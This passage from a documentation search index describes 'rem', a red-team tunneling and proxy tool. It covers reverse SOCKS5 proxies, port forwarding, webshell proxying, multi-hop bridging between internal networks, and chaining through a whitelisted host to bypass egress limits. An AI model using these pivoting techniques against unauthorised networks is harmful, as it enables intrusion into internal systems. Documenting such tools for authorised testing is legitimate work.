\u80fd\u5c06\u4efb\u610f\u6570\u636e\u4ea4\u6362\u7684\u4fe1\u9053\u4f5c\u4e3a\u4ee3\u7406\u96a7\u9053</li> <li>\u901a\u8fc7\u6ce8\u518c\u6a21\u5f0f\u5b9e\u73b0\u6309\u9700\u6761\u4ef6\u7f16\u8bd1, \u5c3d\u53ef\u80fd\u964d\u4f4e\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u4f53\u79ef\u548c\u7279\u5f81</li> <li>\u652f\u6301\u8de8\u8bed\u8a00\u4ea4\u4e92\u6027, \u80fd\u901a\u8fc7\u52a8\u6001/\u9759\u6001\u94fe\u63a5\u5e93\u53ef\u4ee5\u5b9e\u73b0\u5728\u4e0d\u540c\u7684\u8bed\u8a00\u4e2d\u8c03\u7528rem</li> <li>......</li> </ul> <p>\u672c\u8d28\u4e0arem\u53ea\u662f\u4e00\u4e2atunnel/proxy \u5f00\u53d1\u6846\u67b6, \u53ef\u4ee5\u57fa\u4e8e\u8fd9\u4e2a\u6846\u67b6\u5bf9\u6d41\u91cf\u8fdb\u884c\u4efb\u4f55\u7684\u63c9\u6413, \u7ec4\u88c5, \u9690\u85cf. \u4f46\u4e5f\u56e0\u5982\u6b64, \u5728\u5f00\u6e90\u65f6\u53bb\u6389\u4e86\u4e0d\u5c11\u5173\u4e8eOPSEC\u7684\u5177\u4f53\u5b9e\u73b0, \u53ea\u4fdd\u7559\u4e86\u8f83\u4e3a\u57fa\u7840\u7684\u7248\u672c, \u5bf9\u4e8e\u719f\u6089golang\u4e0e\u7f51\u7edc\u7684\u670b\u53cb, \u4f7f\u7528ai\u5c31\u80fd\u5feb\u901f\u5b9e\u73b0\u81ea\u5df1\u60f3\u8981\u7684\u9700\u6c42. </p>"},{"location":"rem/design/#\u9ad8\u7ea7\u7279\u6027","title":"\u9ad8\u7ea7\u7279\u6027","text":""},{"location":"rem/design/#webshell\u4ee3\u7406-done","title":"webshell\u4ee3\u7406 (done)","text":"<p>\u4f8b\u5982\u6240\u6709\u534f\u8bae\u90fd\u4e0d\u51fa\u7f51\u7684\u573a\u666f\uff0c\u7ea2\u961f\u901a\u5e38\u4f1a\u6784\u5efawebshell\u4ee3\u7406\u7684\u65b9\u5f0f\u5b9e\u73b0\uff0c\u5982neoreg\u6216suo5\uff0c\u7136\u540e\u7ea2\u961f\u901a\u8fc7webshell\u4ee3\u7406\u8bbf\u95ee\u5185\u7f51\u3002neoreg\u5b9e\u9645\u4e0a\u662f\u534a\u53cc\u5de5\u7684\u4fe1\u9053\uff0c\u9700\u8981\u901a\u8fc7\u8f6e\u8be2\u8bfb\u53d6\u6570\u636e\uff0c\u56e0\u6b64\u4e0d\u7ba1\u662f\u5ef6\u8fdf\u8fd8\u662f\u6027\u80fd\u90fd\u5e76\u4e0d\u662f\u7279\u522b\u51fa\u8272\uff0c\u800csuo5\u91c7\u7528\u4e86websocket\u5168\u53cc\u5de5\u4fe1\u9053\u3002 gost\u65e0\u6cd5\u5728\u8fd9\u79cd\u573a\u666f\u4e0b\u4f7f\u7528\u3002\u4f46\u5b9e\u9645\u4e0a\u53ef\u4ee5\u5b9e\u73b0neoreg\u4e0esuo5\u4ee3\u7406\u534f\u8bae, \u901a\u8fc7webshell\u4ee3\u7406\u4e0e\u5185\u7f51\u7684agent\u8054\u901a\uff0c\u4ee5\u5b9e\u73b0\u66f4\u590d\u6742\u7684\u6d41\u91cf\u96a7\u9053\u64cd\u4f5c\u3002</p>"},{"location":"rem/design/#\u65e0\u635f\u4ee3\u7406-done","title":"\u65e0\u635f\u4ee3\u7406 (done)","text":"<p>\u5404\u79cd\u4ee3\u7406\u5de5\u5177\u4e3a\u4e86\u4fdd\u8bc1\u6700\u5927\u517c\u5bb9\u5ea6, \u901a\u5e38\u6700\u7ec8\u5bf9\u5916\u66b4\u9732\u7684\u90fd\u662fsocks5\u6216\u8005\u66f4\u9ad8\u7ea7\u4e00\u4e9b\u4f7f\u7528clash. \u4f46\u8fd9\u79cd\u65b9\u5f0f\u8fdb\u884c\u7684\u8f6c\u6362\u5176\u5b9e\u662f\u6709\u975e\u5e38\u5927\u7684\u6027\u80fd\u635f\u5931\u7684.  \u7279\u522b\u662f\u5728\u8fdb\u884c\u626b\u63cf\u65f6\u901a\u5e38\u4f1a\u6709\u5f88\u591a\u76ee\u6807, \u56e0\u6b64\u4f1a\u5728\u672c\u5730\u5efa\u7acb\u5927\u91cf\u7684\u8fde\u63a5. \u8fd9\u79cd\u573a\u666f\u4e0b\u4ee3\u7406\u7684\u6027\u80fd\u4f1a\u6781\u5927\u7684\u8870\u51cf.</p> <p>\u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898, \u4ee3\u7406\u5de5\u5177\u5c31\u5e94\u8be5\u63d0\u4f9b\u76f4\u63a5\u4ea4\u4e92\u7684SDK, \u8ba9\u7b2c\u4e09\u65b9\u5de5\u5177\u80fd\u591f\u76f4\u63a5\u4f7f\u7528\u4ee3\u7406\u5de5\u5177\u7684\u4fe1\u9053\uff0c\u800c\u4e0d\u9700\u8981\u5c06\u5176\u5148\u8f6c\u4e3asocks\u6216\u8005\u5176\u4ed6\u534f\u8bae.</p>"},{"location":"rem/design/#\u7528\u6237\u4f53\u9a8c-done","title":"\u7528\u6237\u4f53\u9a8c (done)","text":"<p>rem\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u53ea\u9700\u8981\u4e00\u884c\u547d\u4ee4, \u7528\u8fc7frp, nps\u4e4b\u7c7b\u7684\u5de5\u5177\u540e, \u6211\u4e0d\u60f3\u8981\u6709\u914d\u7f6e\u6587\u4ef6, \u4e5f\u4e0d\u60f3\u8981\u6709server\u548cclient\u4e24\u7aef. \u53ea\u60f3\u8981\u4e00\u4e2a\u7b80\u6d01\u800c\u4f18\u96c5\u7684\u547d\u4ee4\u884c\u5de5\u5177, \u6240\u6709\u7684\u64cd\u4f5c\u90fd\u901a\u8fc7\u4e00\u884c\u547d\u4ee4\u5b9e\u73b0. </p> <p>\u5e76\u4e14\u9ad8\u5ea6\u590d\u7528\u4e86url\u534f\u8bae\u7684\u5404\u79cd\u529f\u80fd\uff0c \u901a\u8fc7url\u534f\u8bae\u5b8c\u6210\u590d\u6742\u7684\u53c2\u6570\u914d\u7f6e, \u5c06\u57fa\u672c\u53c2\u6570\u7b80\u5316\u5230\u53ea\u9700\u89813\u4e2a. </p>"},{"location":"rem/design/#proxy-as-a-sdk-done","title":"Proxy as a SDK (done)","text":"<p>rem\u9ed8\u8ba4\u63d0\u4f9b\u4e86\u547d\u4ee4\u884c\u5de5\u5177\uff0c \u4f46\u66f4\u91cd\u8981\u7684\u662frem\u80fd\u4f5c\u4e3a\u5305\u88ab\u5d4c\u5165\u5230\u5404\u79cd\u5404\u6837\u7684\u5de5\u5177\u4e2d, \u6216\u8005\u901a\u8fc7proxyclient\u4e0e\u975egolang\u7684\u5de5\u5177\u8054\u52a8.</p> <p>\u5df2\u7ecf\u901a\u8fc7proxyclient\u5b9e\u73b0\u5176\u4ee3\u7406\u529f\u80fd\u7684\u7b2c\u4e09\u65b9\u5de5\u5177\uff1a</p> <ul> <li>https://github.com/chainreactors/gogo</li> <li>https://github.com/chainreactors/zombie</li> <li>https://github.com/zema1/suo5</li> </ul> <p>\u76f4\u63a5\u5d4c\u5165rem\u7684\u5de5\u5177:</p> <ul> <li>https://github.com/chainreactors/malice-network</li> <li>https://github.com/chainreactors/malefic</li> </ul>"},{"location":"rem/usage/","title":"\u5165\u95e8","text":""},{"location":"rem/usage/#usage","title":"Usage","text":"<pre><code>Usage:\n  C:\\Users\\Hunter\\AppData\\Local\\Temp\\go-build3142230917\\b001\\exe\\rem.exe\n        WIKI: https://chainreactors.github.io/wiki/rem\n\n        QUICKSTART:\n                serving:\n                        ./rem\n\n                reverse socks5 proxy:\n                        ./rem -c [link]\n\n                serve socks5 proxy on client:\n                        ./rem -c [link] -m proxy\n\n                remote port forward:\n                        ./rem -c [link] -l port://:8080\n\n                local port forward:\n                        ./rem -c [link] -r port://:8080\n\n\n\nMain Options:\n  -c, --console=        console address\n  -l, --local=          local address\n  -r, --remote=         remote address\n  -d, --destination=    destination agent id\n  -x, --proxy=          outbound proxy chain\n  -f, --forward=        proxy chain for connect to console\n  -m, --mod=            rem mod, reverse/proxy/bind\n  -n, --connect-only    only connect to console\n\nMiscellaneous Options:\n  -k, --key=            key for encrypt\n  -a, --alias=          alias\n      --version         show version\n      --debug           debug mode\n      --detail          show detail\n      --quiet           quiet mode\n      --dump            dump data\n\nConfig Options:\n  -i, --ip=             console external ip address\n      --retry=          retry times (default: 10)\n      --retry-interval= retry interval (default: 10)\n      --sub=            subscribe address (default: http://0.0.0.0:29999)\n      --no-sub          disable subscribe\n\nHelp Options:\n  -h, --help            Show this help message\n</code></pre>"},{"location":"rem/usage/#quickstart","title":"QuickStart","text":"<p>\u547d\u4ee4\u884c\u8bbe\u8ba1\u80fd\u7b80\u5219\u7b80, <code>{}</code>\u4e2d\u7684\u5185\u5bb9\u4e3a\u53ef\u7701\u7565\u7684\u53c2\u6570</p> <p>rem \u9700\u8981\u5728\u88ab client \u4e0e user \u90fd\u80fd\u8bbf\u95ee\u5230\u7684\u4e00\u53f0\u673a\u5668\u4e0a\u642d\u5efa\u4e00\u4e2a\u5bf9\u5916\u66b4\u9732\u7684\u4e2d\u5fc3\u670d\u52a1\u5668.</p> <p>\u503c\u5f97\u4e00\u63d0\u7684\u662f, \u8fd9\u4e2a console \u5e76\u975e\u5b9e\u9645\u610f\u4e49\u4e0a\u7684 server, \u800c\u53ea\u662f\u4ee3\u7406\u94fe\u8def\u4e2d\u5e73\u7b49\u7684\u4e00\u73af.</p> <p>\u4e0d\u9700\u8981\u4efb\u4f55\u53c2\u6570\u542f\u52a8\u7684 rem \u4f1a\u81ea\u52a8\u751f\u6210\u8fde\u63a5\u94fe\u63a5\u4e0e\u8ba2\u9605\u94fe\u63a5</p> <pre><code>./rem\n</code></pre> <p></p> <p>-i \u53ef\u624b\u52a8\u6307\u5b9a\u5bf9\u5916\u66b4\u9732\u7684ip</p> <p>\u8fd9\u91cc\u7684-i \u53ef\u4e0d\u586b, \u4f1a\u81ea\u52a8\u5c1d\u8bd5\u901a\u8fc7 ipip \u83b7\u53d6\u5916\u7f51 ip</p> <p>\u6bcf\u6b21\u542f\u52a8\u90fd\u4f1a\u751f\u6210\u968f\u673a\u7684\u5bc6\u94a5\u4ee5\u53ca\u5404\u79cd\u52a0\u5bc6\u6df7\u6dc6\u914d\u7f6e, \u6240\u4ee5\u9700\u8981\u590d\u5236\u8fd9\u91cc\u751f\u6210\u7684\u914d\u7f6e\u8fde\u63a5, \u7528\u6765\u5728\u5bf9\u7aef\u8fde\u63a5\u4f7f\u7528</p>"},{"location":"rem/usage/#\u53cd\u5411\u4ee3\u7406","title":"\u53cd\u5411\u4ee3\u7406","text":"<p>rem \u9ed8\u8ba4\u7684\u6a21\u5f0f\u5373\u4e3a\u53cd\u5411\u4ee3\u7406, \u5e76\u4f1a\u5728 server \u4e0a\u542f\u52a8 socks5 \u4ee3\u7406</p> <pre><code>./rem -c [link] {-r socks5://user:pass@0.0.0.0:12345}\n</code></pre> <p>\u6781\u7b80\u53c2\u6570</p> <p><code>{}</code>\u4e2d\u7684\u5185\u5bb9\u4e3a\u53ef\u7701\u7565\u7684\u53c2\u6570</p> <p>\u8fd9\u884c\u547d\u4ee4\u53ef\u4ee5\u7f29\u5199\u4e3a</p> <p><code>./rem -c [link]</code></p> <p></p> <p>\u8fd9\u4e2a\u573a\u666f\u7c7b\u4f3c frp \u7684 socks5 \u63d2\u4ef6</p> <p>client \u901a\u8fc7 rem \u652f\u6301\u7684\u4efb\u610f\u4e00\u79cd\u4fe1\u9053\u80fd\u8fde\u63a5\u5230\u5916\u7f51\u5373\u53ef\u5efa\u7acb\u8fde\u63a5, \u5e76\u5728 server \u7aef\u5efa\u7acb socks5 \u670d\u52a1.</p> <p>user \u4f4d\u4e8e\u5916\u7f51, \u901a\u8fc7 socks5 \u670d\u52a1\u5373\u53ef\u8bbf\u95ee client \u6240\u5728\u7684\u7f51\u7edc.</p> <p>\u5bf9\u5916\u66b4\u9732\u4e0d\u540c\u7684\u534f\u8bae</p> <p>rem \u652f\u6301 socks5,http,trojan,shadowsocks \u7b49\u534f\u8bae, \u53ef\u4ee5\u6307\u5b9a\u4efb\u610f\u534f\u8bae, \u5177\u4f53\u8bf7\u89c1\u6587\u4ef6:\u5e94\u7528\u5c42</p> <p><code>./rem -c [link] -r ss://</code></p>"},{"location":"rem/usage/#\u6b63\u5411\u4ee3\u7406","title":"\u6b63\u5411\u4ee3\u7406","text":"<p>\u4e0e\u53cd\u5411\u4ee3\u7406\u76f8\u53cd, \u53ef\u4ee5\u5728 client \u4e0a\u642d\u5efa socks5 \u670d\u52a1\uff0c \u8bbf\u95ee server \u6240\u5728\u7684\u7f51\u7edc</p> <p><code>./rem -c [link] -m proxy</code> </p> <p>\u5de5\u4f5c\u6a21\u5f0f</p> <p><code>-m</code> \u8868\u793a\u5de5\u4f5c\u6a21\u5f0f, \u8bf7\u89c1 \u6587\u6863:\u4f20\u8f93\u5c42</p> <p><code>-m reverse</code> \u8868\u793a inbound \u4f4d\u4e8e server \u7aef</p> <p><code>-m proxy</code> \u8868\u793a inbound \u4f4d\u4e8e client \u7aef</p> <p>\u8fd9\u4e2a\u573a\u666f\u4e2d user \u4f4d\u4e8e\u5185\u7f51, client \u901a\u8fc7 rem \u652f\u6301\u7684\u4efb\u610f\u4e00\u79cd\u4fe1\u9053\u80fd\u8fde\u63a5\u5230\u5916\u7f51\u5373\u53ef\u5efa\u7acb\u8fde\u63a5, \u5e76\u5728 client \u7aef\u6253\u5f00 socks5 \u670d\u52a1.</p> <p>user \u53ef\u4ee5\u901a\u8fc7 client \u4e0a\u76d1\u542c\u7684 socks5 \u670d\u52a1\u5b9e\u73b0\u51fa\u7f51, \u8bbf\u95ee server \u80fd\u8bbf\u95ee\u5230\u7684\u7f51\u7edc. \u5728\u4e00\u4e9b\u6709\u5404\u79cd\u9650\u5236\u7684\u4e0d\u51fa\u7f51\u573a\u666f\u4e2d\u5e38\u7528.</p>"},{"location":"rem/usage/#\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1","title":"\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1","text":"<p>server \u4f1a\u76d1\u542c\u4e00\u4e2a\u7aef\u53e3, \u8bbf\u95ee\u8be5\u7aef\u53e3\u7684\u6d41\u91cf\u90fd\u4f1a\u8f6c\u53d1\u5230 client \u7684\u6307\u5b9a\u7aef\u53e3</p> <p><code>./rem -c [link] -l port://:8000</code> </p> <p>-l \u4e0e-r</p> <p>\u4e00\u822c\u6765\u8bf4, \u8fd9\u4e24\u4e2a\u53c2\u6570\u4f1a\u5728 client \u7aef\u4f7f\u7528, \u7528\u6765\u63cf\u8ff0\u7528\u6237\u5c42\u534f\u8bae.</p> <p><code>-r</code> \u8868\u793a remote, \u5373 server \u7aef.</p> <p><code>-l</code> \u8868\u793a local, \u5373 client(\u81ea\u8eab)\u7aef</p> <p>\u901a\u8fc7\u8fd9\u4e24\u4e2a\u53c2\u6570\u7684\u7ec4\u5408, \u53ef\u4ee5\u6784\u9020\u51fa\u4efb\u610f\u60f3\u8981\u7684\u5e94\u7528\u5c42\u529f\u80fd</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b, \u672a\u63cf\u8ff0<code>-r</code> \u4f1a\u4f7f\u7528\u968f\u673a\u751f\u6210\u7684\u7aef\u53e3. \u4e5f\u53ef\u4ee5\u624b\u52a8\u6307\u5b9a server \u7684\u7aef\u53e3</p> <pre><code>./rem -c [link] -r :12345 -l port://:8000\n</code></pre> <p>\u7b49\u4ef7\u4e8e ssh \u7684<code>ssh -R 12345:localhost:8000 user@ip</code></p> <p><code>-l</code> \u7684 host \u7559\u7a7a\u8868\u793a 127.0.0.1. \u53ef\u4ee5\u6307\u5b9a client \u5185\u7f51 ip</p> <pre><code>./rem -c [link] -l port://[internal_ip]:8000\n</code></pre>"},{"location":"rem/usage/#\u672c\u5730\u7aef\u53e3\u8f6c\u53d1","title":"\u672c\u5730\u7aef\u53e3\u8f6c\u53d1","text":"<p>\u4e0e\u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1\u76f8\u53cd, client \u76d1\u542c\u4e00\u4e2a\u7aef\u53e3, \u8bbf\u95ee\u8be5\u7aef\u53e3\u7684\u6d41\u91cf\u4f1a\u8f6c\u53d1\u5230 server \u7684\u6307\u5b9a\u7aef\u53e3</p> <p><code>./rem -c [link] -r port://:8000 -m proxy</code></p>"},{"location":"rem/usage/#url-\u7f29\u5199","title":"url \u7f29\u5199","text":"<p>rem \u4e2d\u7684 url \u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u7f29\u5199\u8868\u793a\u9ed8\u8ba4\u503c, \u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u7528\u7684\u793a\u4f8b.</p> <pre><code>#socks5\u4ee3\u7406\nsocks5://:10086\n</code></pre> <pre><code># \u53ea\u4fdd\u7559\u534f\u8bae\nss://\n</code></pre> <pre><code># \u6307\u5b9a\u7aef\u53e3\n:12345\n</code></pre> <pre><code># \u4ec5\u6307\u5b9ahost, \u81ea\u52a8\u8865\u5168\u5176\u4ed6\u53c2\u6570\n127.0.0.1\n</code></pre>"},{"location":"rem/usage/#\u53c2\u6570\u89e3\u91ca","title":"\u53c2\u6570\u89e3\u91ca","text":"<p>\u5f53\u4e24\u4e2a rem \u5efa\u7acb\u8fde\u63a5, \u5b9e\u9645\u4e0a\u5c31\u865a\u62df\u4e86\u4e00\u4e2a\u4f20\u8f93\u5c42\u7f51\u7edc. \u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u4e2a\u7f51\u7edc\u4e0a\u5b9e\u73b0\u81ea\u7531\u8f6c\u53d1\u6570\u636e\u6784\u9020\u4e0a\u5c42\u5e94\u7528.</p> <p>rem \u63d0\u4f9b\u4e86\u4e09\u79cd\u5de5\u4f5c\u6a21\u5f0f, \u5206\u522b\u662f:</p> <ul> <li>reverse(\u9ed8\u8ba4) , \u5efa\u7acb\u8fde\u63a5\u540e inbound \u5728 server \u7aef, \u4f1a\u5728 server \u4e0a\u76d1\u542c\u6765\u81ea\u7aef\u53e3\u63a5\u6536\u6570\u636e</li> <li>proxy, \u5efa\u7acb\u8fde\u63a5\u540e inbound \u5728 client \u7aef, \u4f1a\u5728 client \u4e0a\u76d1\u542c\u7aef\u53e3\u63a5\u6536\u6570\u636e</li> <li>bind, \u7b80\u5355\u5de5\u4f5c\u6a21\u5f0f, \u4e0d\u9700\u8981\u4e24\u4e2a rem \u5efa\u7acb\u8fde\u63a5</li> </ul> <p>\u6bcf\u4e2a agent \u8fdb\u7a0b\u5728\u903b\u8f91\u4e0a\u884c\u53ef\u4ee5\u627f\u8f7d\u4efb\u610f\u591a\u4e2a\u96a7\u9053, \u81ea\u52a8\u6839\u636e rem \u4e4b\u95f4\u5efa\u7acb\u7684\u4f20\u8f93\u5c42\u4fe1\u9053\u94fe\u63a5\u590d\u7528. \u4e3a\u4e86\u547d\u4ee4\u64cd\u4f5c\u65b9\u4fbf, \u4e00\u822c\u60c5\u51b5\u4e0b, \u6211\u4eec\u901a\u8fc7\u4e00\u884c\u547d\u4ee4\u63cf\u8ff0\u4e00\u4e2a\u670d\u52a1.</p>"},{"location":"rem/usage/#console","title":"Console","text":"<p>Console\u5f53\u524d\u652f\u6301\u7684\u4f20\u8f93\u5c42</p> <ul> <li>tcp \u9ed8\u8ba4\u542f\u7528</li> <li>udp (arq \u534f\u8bae: kcp) \u9ed8\u8ba4\u542f\u7528</li> <li>icmp (arq \u534f\u8bae: kcp)</li> <li>unix , windows \u4e0a\u57fa\u4e8e\u547d\u540d\u7ba1\u9053(SMB)\u5b9e\u73b0, \u975e unix \u7cfb\u7edf\u57fa\u4e8e\u6587\u4ef6\u5b9e\u73b0</li> <li>websocket</li> <li>wireguard</li> <li>http (\u901a\u8fc7\u5355\u5de5\u4fe1\u9053\u6a21\u62df, arq \u534f\u8bae kcp)</li> <li>memory \u672c\u8fdb\u7a0b\u4e2d\u4f7f\u7528\u7684\u865a\u62df\u4fe1\u9053</li> </ul> <p>\u5b8c\u6574\u793a\u4f8b:  <pre><code>./rem -c [transport]://[key]:@[host]:[port]?wrapper=[]&amp;tls=[bool]&amp;tlsintls=[bool]&amp;compress=[bool]\n</code></pre></p> <p>\u6bcf\u4e2a<code>[]</code>\u90fd\u8868\u793a\u53ef\u9009\u9879, \u6240\u6709\u53c2\u90fd\u53ef\u7559\u7a7a\uff0c \u6700\u7b80\u8868\u8fbe\u4e3a\u642d\u5efatcp\u534f\u8bae\u7684rem console\uff0c \u968f\u673a\u52a0\u5bc6\u65b9\u5f0f\u3002</p> <p>\u53c2\u6570\u89e3\u91ca:</p> <ul> <li>transport:  \u4f20\u8f93\u5c42\uff0c\u9ed8\u8ba4\u4e3atcp </li> <li>key: \u914d\u7f6e\u52a0\u5bc6\u5bc6\u94a5\uff0c \u7559\u7a7a\u81ea\u52a8\u4f7f\u7528\u9ed8\u8ba4\u503c</li> <li>host: host\u7559\u7a7a\u6216\u8005\u4e3a0.0.0.0 \u65f6\u8868\u793a\u76d1\u542crem console \u670d\u52a1, \u5176\u4ed6\u503c\u5219\u4e3a\u6307\u5b9adomain/ip\u7684rem console</li> <li>port: console \u7aef\u53e3</li> <li>wrapper: \u7559\u7a7a\u81ea\u52a8\u751f\u6210\u968f\u673a\u52a0\u5bc6\u65b9\u5f0f\uff0c \u7279\u6b8a\u503c<code>raw</code>\u4e0d\u542f\u7528\u4efb\u4f55\u52a0\u5bc6\u65b9\u5f0f</li> <li>tls: \u81ea\u52a8\u751f\u6210tls\u914d\u7f6e\uff0c\u5e76\u6253\u5f00tls\u901a\u8baf\uff0c\u9ed8\u8ba4\u4e0d\u542f\u7528</li> <li>tlsintls\uff0c\u9ed8\u8ba4\u4e0d\u542f\u7528</li> </ul>"},{"location":"rem/usage/#local-remote","title":"Local &amp;&amp; Remote","text":"<p>rem \u901a\u8fc7-l\u4e0e-r \u63cf\u8ff0\u6240\u6709\u7684\u5e94\u7528\u5c42\u5e38\u89c1\uff0c \u901a\u8fc7-m\u63cf\u8ff0\u6d41\u91cf\u65b9\u5411\u3002 </p> <p>\u4e09\u79cdmod:</p> <ul> <li>reverse (\u9ed8\u8ba4\u503c), \u8868\u793a\u6d41\u91cf\u5165\u53e3\u5728server\uff0c \u4f1a\u5728server\u76d1\u542c\u4e00\u4e2a\u670d\u52a1</li> <li>proxy , \u8868\u793a\u6d41\u91cf\u5165\u53e3\u5728client\uff0c \u4f1a\u5728client\u76d1\u542c\u4e00\u4e2a\u670d\u52a1</li> <li>bind , \u5355\u673a\u6a21\u5f0f, \u642d\u5efa\u666e\u901a\u7684http/socks5\u4ee3\u7406</li> </ul> <p>\u5e94\u7528\u5c42\u534f\u8bae </p> <ul> <li>socks5 (\u9ed8\u8ba4\u542f\u7528)</li> <li>http/https (\u9ed8\u8ba4\u542f\u7528)</li> <li>port forward (\u9ed8\u8ba4\u542f\u7528)</li> <li>trojan</li> <li>shadowsocks</li> </ul> <p>\u901a\u8fc7\u7ec4\u5408remote, local , mod \u5373\u53ef\u5b9e\u73b0\u5404\u79cd\u5e94\u7528\u573a\u666f\u3002</p> <p>todo: \u6709\u4e00\u4e9b\u53c2\u6570\u6709\u7279\u6b8a\u7684\u914d\u7f6e, \u6b63\u5728\u8865\u5145</p>"},{"location":"rem/usage/#forward","title":"Forward","text":"<p>\u8f6c\u53d1\u5668,  \u7528\u4f5c client \u8fde\u63a5 server \u65f6\u9700\u8981\u8de8\u8fc7\u7684\u6d41\u91cf\u8282\u70b9.</p> <p>\u4f8b\u5982 client \u8fde\u63a5 server \u7684\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7\u591a\u7ea7\u4ee3\u7406, \u5e38\u89c1\u4e8e\u4e0d\u51fa\u7f51\u5185\u7f51\u4f46\u5b58\u5728\u4e00\u4e2a http/socks5 \u4ee3\u7406\u8ba9\u90e8\u5206\u5e94\u7528\u80fd\u591f\u51fa\u7f51.</p> <p>fowardd flag\u4e3a<code>-f</code>/<code>forward</code></p> <p><code>./rem -c [link] -f socks5://192.168.1.1:1080 -f http://192.168.2.2:1081</code></p> <p>\u4f7f\u7528\u573a\u666f\uff1a</p> <p>\u76ee\u6807\u7f51\u7edc\u73af\u5883\u4e0d\u51fa\u7f51\uff0c \u4f46\u662f\u7ed9\u5fc5\u987b\u51fa\u7f51\u7684\u5e94\u7528\u914d\u7f6e\u4e86\u5185\u90e8\u7684 http \u4ee3\u7406\uff08192.168.2.2\uff09\uff0c \u5e76\u4e14\u9650\u5236\u4e86\u767d\u540d\u5355 ip\uff08192.168.1.1\uff09\u8bbf\u95ee\u5185\u7f51\u51fa\u7f51\u4ee3\u7406\u3002</p> <p>\u5148\u901a\u8fc7 192.168.1.1 \u7ed5\u8fc7\u767d\u540d\u5355\u9650\u5236\uff0c \u518d\u901a\u8fc7\u51fa\u7f51\u4ee3\u7406\u5efa\u7acb\u4ee3\u7406</p> <p>proxyclient\u7684\u914d\u7f6e\u8bf7\u89c1: https://chainreactors.github.io/wiki/libs/proxyclient/</p>"},{"location":"rem/usage/#outbound-proxy","title":"Outbound Proxy","text":"<p>outbound\u4f1a\u5728\u67d0\u4e00\u7aef\u5bf9\u5916\u53d1\u8d77\u8bf7\u6c42,  \u8fd9\u4e2a\u8bf7\u6c42\u540c\u6837\u652f\u6301\u4ee3\u7406\u94fe\u3002</p> <p>\u4f8b\u5982\u53cd\u5411\u4ee3\u7406\u573a\u666f\uff0c \u5185\u7f51\u5b58\u5728\u4e00\u4e2asocks5\u4ee3\u7406\u8df3\u677f. \u53ef\u4ee5\u901a\u8fc7\u914d\u7f6eoutbound proxy\u5b9e\u73b0\u7b80\u5355\u591a\u7ea7\u53cd\u5411\u4ee3\u7406\u3002</p> <p>outbound proxy\u7684flag\u4e3a<code>-x</code> / <code>--proxy</code></p> <pre><code>./rem -c [rem_link] -r socks5://:10080 -x socks5://10.1.1.1:1080\n</code></pre> <p>proxyclient\u7684\u914d\u7f6e\u8bf7\u89c1: https://chainreactors.github.io/wiki/libs/proxyclient/</p>"},{"location":"rem/usage/#\u591a\u7ea7\u7f51\u7edc","title":"\u591a\u7ea7\u7f51\u7edc","text":"<p>\u7ea7\u8054\u5206\u4e3a\u591a\u4e2a\u7ec6\u5206\u573a\u666f\uff0c \u5b9e\u9645\u4e0a\u662f\u6781\u4e3a\u590d\u6742\u7684\u3002 \u4e5f\u6536\u5230\u4e86\u8f83\u591a\u5bf9\u7ea7\u8054\u6bd4\u8f83\u8ff7\u60d1\u7684\u53cd\u9988\u3002</p>"},{"location":"rem/usage/#\u573a\u666f1-\u6865\u63a5","title":"\u573a\u666f1 \u6865\u63a5","text":"<p>\u5047\u8bbe\u6709\u5185\u7f51\u670d\u52a1\u5668A\uff0c\u5185\u7f51\u670d\u52a1\u5668B \uff0c A\u4e0eB\u4f4d\u4e8e\u4e0d\u540c\u7684\u5185\u7f51\u4e2d\uff0c \u6709A\u4e0eB\u90fd\u80fd\u8bbf\u95ee\u5230\u7684\u670d\u52a1\u5668C</p> <p>\u76ee\u7684\u662f\u6253\u901aA\u4e0eB\u7684\u7f51\u7edc\uff0c\u8fd9\u4e2a\u573a\u666f\u6709\u70b9\u7c7b\u4f3cCobaltstrike\u7684rportfwd_local\uff0c \u9700\u8981\u5c06\u76ee\u6807\u670d\u52a1\u5668\u7684\u67d0\u7aef\u53e3\u8f6c\u53d1\u5230\u672c\u5730\u3002 \u4f46\u662frem\u53ef\u4ee5\u66f4\u8fdb\u4e00\u6b65\uff0c \u76f4\u63a5\u8fdb\u884c\u4ee3\u7406\u800c\u4e0d\u662f\u7aef\u53e3\u8f6c\u53d1\u3002 </p> <p>\u6211\u4eec\u901a\u8fc7\u670d\u52a1\u5668C\u4f5c\u4e3a\u6865\uff0c \u6253\u901aA\u4e0eB\u7684\u5185\u7f51\u3002</p> <p>user -[\u5355\u5411\u8bbf\u95ee]-&gt; console &lt;-[\u5355\u5411\u8bbf\u95ee]- client</p> <p>rem \u7684\u6865\u63a5\u901a\u8fc7 -d/--destination \u5b9e\u73b0</p> <p>\u6bcf\u4e2a\u8fde\u63a5\u5bf9\u90fd\u4f1a\u6709\u552f\u4e00 ID, \u4e5f\u53ef\u4ee5\u4f7f\u7528 alias(\u901a\u8fc7-a/--alias \u81ea\u5b9a\u4e49)</p> <p>\u670d\u52a1\u5668C \u542f\u52a8 rem</p> <pre><code>./rem\n</code></pre> <p>\u5185\u7f51A \u8fde\u63a5\u5230 C</p> <p>\u5982\u679c\u4e0d\u586b alias,\u5219\u662f\u81ea\u52a8\u5206\u914d\u7684 ip:port</p> <pre><code>./rem -c [link] -a internal\n</code></pre> <p>\u5185\u7f51B\u8fde\u63a5\u5230 C</p> <p>\u5c06\u4f1a\u5728\u5185\u7f51A\u76d1\u542c\u4e00\u4e2a socks5 \u7aef\u53e3, \u901a\u8fc7\u8be5\u7aef\u53e3\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u5230 A\u6240\u5728\u7684\u5185\u7f51. </p> <pre><code>./rem -c [link]  -d internal\n</code></pre> <p>\u5177\u4f53\u7528\u6cd5\u4e0e\u975e\u7ea7\u8054\u573a\u666f\u5b8c\u5168\u4e00\u81f4</p> <p>\u5c06\u5728 A \u76d1\u542c socks5 \u7aef\u53e3, \u901a\u8fc7\u8be5\u7aef\u53e3\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u5230 B \u6240\u5728\u7684\u5185\u7f51.</p> 